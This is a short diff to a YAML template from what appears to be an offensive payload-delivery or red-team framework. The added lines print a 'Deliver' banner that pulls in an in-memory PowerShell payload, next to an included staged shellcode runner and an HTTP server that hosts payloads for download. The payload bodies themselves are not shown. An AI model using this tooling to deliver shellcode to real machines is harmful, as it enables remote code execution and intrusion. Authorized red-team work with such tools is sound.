@@ -11,4 +11,7 @@ content: |
   {{ include('scripts/pwsh-shcode_run-staged.yaml') }}
   EOF
   echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver: {{ include('payloads/invoke_pwsh_in-memory.yaml') }}'; \
+  echo '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
